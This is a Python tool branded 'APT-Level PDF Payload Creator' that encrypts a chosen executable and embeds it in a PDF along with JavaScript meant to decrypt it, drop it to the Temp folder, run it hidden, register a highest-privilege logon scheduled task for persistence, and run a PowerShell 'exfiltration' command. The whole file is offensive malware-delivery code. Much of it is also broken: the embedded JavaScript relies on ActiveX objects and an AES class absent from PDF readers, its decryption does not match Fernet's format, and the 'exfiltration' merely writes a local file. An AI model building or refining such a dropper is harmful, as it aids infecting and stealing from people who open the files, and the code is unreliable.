import base64
import os
import time
import random
import string
import subprocess
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding  # Updated import
from PyPDF2 import PdfWriter, PdfReader
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
from io import BytesIO
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn
from rich.prompt import Prompt
from rich.table import Table
from rich.panel import Panel
from tkinter import Tk
from tkinter.filedialog import askopenfilename

# Initialize Rich Console
console = Console()

# Generate a key for encryption
def generate_symmetric_key():
    """Generates a symmetric Fernet encryption key."""
    return Fernet.generate_key()

def generate_asymmetric_keys():
    """Generates RSA public and private keys."""
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()
    return private_key, public_key

def encrypt_payload(payload, key):
    """Encrypts the given payload using the provided Fernet key."""
    cipher = Fernet(key)
    return cipher.encrypt(payload)

def encrypt_with_public_key(payload, public_key):
    """Encrypts the payload using the RSA public key."""
    encrypted = public_key.encrypt(
        payload,
        padding.OAEP(  # Use the imported padding here
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted

def random_filename(extension=".exe"):
    """Generates a random filename with the given extension."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + extension

def create_advanced_pdf(output_pdf_path, encrypted_payload, symmetric_key):
    """Creates a PDF with an embedded encrypted payload and JavaScript to execute it."""
    try:
        buffer = BytesIO()
        c = canvas.Canvas(buffer, pagesize=letter)
        c.drawString(100, 750, "This PDF contains an advanced APT-level payload.")
        c.save()

        buffer.seek(0)
        new_pdf = PdfReader(buffer)
        output_pdf = PdfWriter()
        output_pdf.add_page(new_pdf.pages[0])

        # JavaScript for a stealthy execution and data exfiltration
        js_code = f"""
        var key = "{base64.urlsafe_b64encode(symmetric_key).decode()}";
        var payload = "{base64.urlsafe_b64encode(encrypted_payload).decode()}";

        function decryptPayload(encryptedPayload, key) {{
            var iv = encryptedPayload.slice(0, 16); // Extract IV
            var encryptedBytes = encryptedPayload.slice(16); // Extract encrypted data
            var aes = new AES(key);
            return aes.decrypt(encryptedBytes, iv);
        }}

        function executePayload() {{
            try {{
                var decryptedPayload = decryptPayload(payload, key);
                var fileStream = new ActiveXObject("ADODB.Stream");
                fileStream.Type = 1; // Binary
                fileStream.Open();
                fileStream.Write(decryptedPayload);
                var tempPath = "C:\\Users\\YourUsername\\AppData\\Local\\Temp\\" + generateRandomFileName();
                fileStream.SaveToFile(tempPath, 2); // Save as overwrite
                fileStream.Close();

                var shell = new ActiveXObject("WScript.Shell");
                shell.Run(tempPath, 0);

                // Create persistence through a scheduled task
                var taskName = "MyAPTTask";
                shell.Run("schtasks /create /tn " + taskName + " /tr \\"" + tempPath + "\\" /sc onlogon /rl highest", 0);
                
                // Exfiltrate sensitive information
                exfiltrateData();

                console.log("Payload executed and persistence created successfully.");
            }} catch (e) {{
                console.log("Error executing payload: " + e.message);
            }}
        }}

        function generateRandomFileName() {{
            var chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            var randomFileName = "";
            for (var i = 0; i < 10; i++) {{
                randomFileName += chars.charAt(Math.floor(Math.random() * chars.length));
            }}
            return randomFileName + ".exe";
        }}

        function exfiltrateData() {{
            // Gather browser passwords (example)
            try {{
                var shell = new ActiveXObject("WScript.Shell");
                var command = "cmd /c powershell -command \\"Get-ItemProperty -Path \\'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\\' | Select-Object DisplayName, DisplayVersion, Publisher | Out-File C:\\Users\\YourUsername\\Documents\\installed_software.txt\\"";
                shell.Run(command, 0);
                console.log("Installed software information exfiltrated.");
            }} catch (e) {{
                console.log("Error exfiltrating data: " + e.message);
            }}
        }}

        executePayload();
        """
        output_pdf.add_js(js_code)

        with open(output_pdf_path, "wb") as f:
            output_pdf.write(f)
        console.print(f"[green]PDF created successfully at {output_pdf_path}[/green]")

    except Exception as e:
        console.print(f"[red]Failed to create PDF: {str(e)}[/red]")

def select_file():
    """Prompts the user to select a binary file (.exe or .bin)."""
    Tk().withdraw()  # Hides the root window
    file_path = askopenfilename(filetypes=[
        ("Executable files", "*.exe"),
        ("Binary files", "*.bin"),
        ("All files", "*.*")
    ])
    return file_path

def read_binary_file(file_path):
    """Reads the contents of a binary file."""
    with open(file_path, 'rb') as f:
        return f.read()

def main():
    # Interactive TUI
    console.print(Panel("[bold green]APT-Level PDF Payload Creator[/bold green]", style="bold magenta", title="Welcome"))
    time.sleep(1)
    
    # Ask user to select a binary file for the payload
    file_path = select_file()
    if not file_path:
        console.print("[red]No file selected. Exiting.[/red]")
        return
    
    payload = read_binary_file(file_path)
    
    output_pdf_name = Prompt.ask("[cyan]Enter the name for the output PDF file (with .pdf extension)[/cyan]", default="advanced_payload.pdf")
    
    console.print(f"[cyan]Creating payload from file: {file_path}[/cyan]")
    
    # Generate symmetric and asymmetric keys
    symmetric_key = generate_symmetric_key()
    private_key, public_key = generate_asymmetric_keys()
    
    # Encrypt the payload
    encrypted_payload = encrypt_payload(payload, symmetric_key)
    encrypted_symmetric_key = encrypt_with_public_key(symmetric_key, public_key)

    # Rich TUI for progress
    with Progress(
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3}%"),
        console=console,
    ) as progress:
        task = progress.add_task("[cyan]Creating PDF...", total=100)
        
        # Create the advanced PDF with encrypted payload
        create_advanced_pdf(output_pdf_name, encrypted_payload, symmetric_key)
        progress.update(task, advance=100)
    
    # Display final payload details in a table
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("Property", style="dim")
    table.add_column("Value")
    
    table.add_row("Payload File", os.path.basename(file_path))
    table.add_row("Encrypted Payload (Base64)", base64.urlsafe_b64encode(encrypted_payload).decode())
    table.add_row("Encryption Key (Base64)", base64.urlsafe_b64encode(symmetric_key).decode())
    table.add_row("Encrypted Symmetric Key (Base64)", base64.urlsafe_b64encode(encrypted_symmetric_key).decode())
    table.add_row("Output PDF File", output_pdf_name)

    console.print(table)

if __name__ == "__main__":
    main()

